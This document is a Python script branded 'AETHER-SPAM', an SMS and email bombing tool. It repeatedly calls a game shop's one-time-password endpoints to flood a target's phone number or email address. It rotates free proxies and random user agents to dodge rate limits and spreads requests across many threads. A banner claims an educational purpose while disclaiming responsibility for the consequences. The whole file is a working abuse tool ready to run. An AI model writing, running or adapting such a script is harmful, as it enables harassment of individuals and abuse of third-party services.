import requests
import threading
import random
from colorama import init, Fore
#don't edit the code , respect the original author

# Initialize colorama
init()

colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN,]
success = 0
lost = 0
# Function to fetch proxies from the URL

def fetch_proxies(proxy_option):
    if proxy_option.lower() in ["list file", "f"]:
        file_path = input("Enter the path to the list file: ")
        try:
            with open(file_path, 'r') as file:
                proxies = file.readlines()
            return proxies
        except FileNotFoundError:
            print("File not found.")
            return []
    
    elif proxy_option.lower() in ["link", "l"]:
        link = input("Enter the link to fetch proxies: ")
        try:
            response = requests.get(link)
            if response.status_code == 200:
                proxies = response.text.split('\n')
                return proxies
        except Exception as e:
            print("Error fetching proxies from the provided link.")
            return []
    
    elif proxy_option.lower() in ["manually", "m"]:
        num_proxies = int(input("Enter the number of proxies you want to enter manually: "))
        proxies = []
        for _ in range(num_proxies):
            proxy = input("Enter proxy (format: ip:port): ")
            proxies.append(proxy)
        return proxies
    
    elif proxy_option.lower() == "default":
        return fetch_default_proxies()
    
    else:
        print("Using default proxies.")
        return fetch_default_proxies()

def fetch_default_proxies():
    try:
        response = requests.get('https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt')
        if response.status_code == 200:
            proxy_data = response.text.split('\n')[4:-1]  # Skip header and empty line
            proxies = [line.split(',')[0] for line in proxy_data]
            return proxies
    except Exception as e:
        return []


# Function to fetch user agents from the URL
def fetch_user_agents():
    try:
        response = requests.get('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt')
        if response.status_code == 200:
            user_agents = response.text.split('\n')
            return user_agents
    except Exception as e:
        return []

# Function to send request
def send_request(phone_number, proxies, user_agents, num_requests):
    global success, lost, stype
    lock = threading.Lock()
    
    url = f'https://akhgameshop.org{stype}'  # Set the URL based on the global stype variable
    
    for _ in range(num_requests):
        ua = random.choice(user_agents)
        headers = {
            'User-Agent': ua,
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Content-Type': 'application/json',
            'Origin': 'https://akhgameshop.com',
            'Referer': 'https://akhgameshop.com/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'cross-site',
            'Te': 'trailers',
            'Connection': 'close'
        }
        
        proxy = random.choice(proxies)
        proxies_dict = {
            'http':  proxy,
            'https':  proxy,
        }
        try:
            response = requests.post(url, headers=headers, json=data, proxies=proxies_dict, timeout=10)
            if response.status_code == 200:
                color = random.choice(colors)
                with lock:  # Use lock to avoid race conditions
                    success += 1
                print(color + f"[{success}] Successfully sent to {phone_number} using {proxy}" + Fore.RESET)
        except Exception as e:
            with lock:  
                lost += 1
            print(Fore.RED + f"[{lost}] Error occurred while sending request: Can't connect to proxy {proxy}" + Fore.RESET)


def main(phone_number, num_threads, num_requests_per_thread, proxy_option):
    proxies = fetch_proxies(proxy_option)
    if not proxies:
        print(Fore.RED + "No proxies available. Exiting." + Fore.RESET)
        return
    user_agents = fetch_user_agents()
    if not user_agents:
        print(Fore.RED + "No user agents available. Exiting." + Fore.RESET)
        return
    # Variable to keep track of successful messages
    lock = threading.Lock()

    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=send_request, args=(phone_number, proxies, user_agents, num_requests_per_thread))
        thread.start()
        threads.append(thread)
    for thread in threads:
        thread.join()
    print(Fore.GREEN + f"\n[!] All/{num_threads * num_requests_per_thread}/ threads completed." + Fore.RESET)
    print(Fore.CYAN + f"\n[$] {success} messages sent Successfully to {phone_number}." + Fore.RESET)
    print(Fore.RED+ f"\n[?] {lost} Threads  lost" + Fore.RESET)

data = {}


if __name__ == "__main__":
    # Banner
    print(random.choice(colors) + r"""
   ___   ____________ _________      _______  ___   __  ___
  / _ | / __/_  __/ // / __/ _ \____/ __/ _ \/ _ | /  |/  /
 / __ |/ _/  / / / _  / _// , _/___/\ \/ ___/ __ |/ /|_/ / 
/_/ |_/___/ /_/ /_//_/___/_/|_|   /___/_/  /_/ |_/_/  /_/  

@AETHER-SPAM
    
[Author   : Aether]
[Telegram : @a37h3r]
[Github   : https://github.com/Aether-0/]
[Facebook : https://www.facebook.com/Phoenixop0]

[#]""" + Fore.RED + r""" This tool serves an educational purpose exclusively, and I'm indifferent to any alternative outcomes or consequences.
""" + Fore.RESET)
    # Prompt user for input
    itype = input(random.choice(colors)+"[0] Enter '1' for email or '2' for SMS: " + Fore.RESET)
    stype = "/api/send-email-otp" if itype == '1' else "/api/send-phone-otp"
    phone_number = input(random.choice(colors)+"Enter your email address: "+Fore.RESET) if itype == '1' else input(random.choice(colors)+"Enter your phone number: "+ Fore.RESET)
# Set global data variable based on user input
    if itype == '1':
        data = {"email": phone_number}
    elif itype == '2':
        data = {"phone": phone_number}
    # else:
        # print(Fore.RED + "Invalid INPUT or{ mode : sms} " + Fore.RESET)

    # phone_number = input(random.choice(colors) + "[*] Enter Target Email or Phone Number :" + Fore.RESET)
    num_threads = int(input(random.choice(colors) + "[x] Enter number of threads: " + Fore.RESET))
    num_requests_per_thread = int(input(random.choice(colors) + "[=] Enter number of requests per thread: " + Fore.RESET))
    proxy_option = input(random.choice(colors) + "Select proxy source (list file[f], link[l], manually[m], default[enter]): " + Fore.RESET).lower()

    main(phone_number, num_threads, num_requests_per_thread, proxy_option)
